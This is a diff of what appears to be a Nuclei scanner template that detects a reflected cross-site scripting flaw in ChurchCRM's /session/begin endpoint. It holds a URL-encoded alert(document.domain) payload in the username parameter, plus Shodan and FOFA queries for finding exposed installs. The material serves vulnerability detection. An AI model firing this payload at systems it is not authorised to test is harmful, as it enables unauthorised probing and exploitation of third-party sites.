@@ -1,4 +1,5 @@
 id: churchcrm-xss
+
 info:
   name: ChurchCRM - Cross-Site Scripting
   author: pikpikcu
@@ -10,27 +11,29 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
     cvss-score: 6.5
-    cwe-id: CWE-79,CWE-80
-    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
+    cwe-id: CWE-80
     epss-score: 0.07062
     epss-percentile: 0.94141
+    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
   metadata:
-    runzero-match: any(each(service["html.titles"]), {# matches "(?i)ChurchCRM"})
-    fofa-query: app="ChurchCRM"
-    max-request: 1
-    product: churchcrm
-    shodan-query: title:"ChurchCRM"
-    vendor: churchcrm
     verified: true
-  tags: churchcrm,crm,vuln,xss
+    max-request: 1
+    shodan-query: title:"ChurchCRM"
+    fofa-query: app="ChurchCRM"
+    product: churchcrm
+    vendor: churchcrm
+  tags: churchcrm,xss,crm,vuln
+
 http:
-  - matchers:
-      - condition: and
-        dsl:
-          - status_code == 200
-          - contains(to_lower(content_type), "text/html")
-          - contains_all(tolower(body), "<script>alert(document.domain)</script>", "churchcrm")
-        type: dsl
-    method: GET
+  - method: GET
     path:
-      - '{{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      - "{{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(to_lower(content_type), "text/html")'
+          - 'contains_all(tolower(body), "<script>alert(document.domain)</script>", "churchcrm")'
+        condition: and
+# digest: 490a0046304402203df3f22ef3ef52bac504249ef6bdbeb4d80d3eb7a62128242b3f1c45b244714402203c4aaebf5f0516e9b7580d73a464df6a7023336b16ea05664a24801e83930b90:922c64590222798bb761d5b6d8e72950
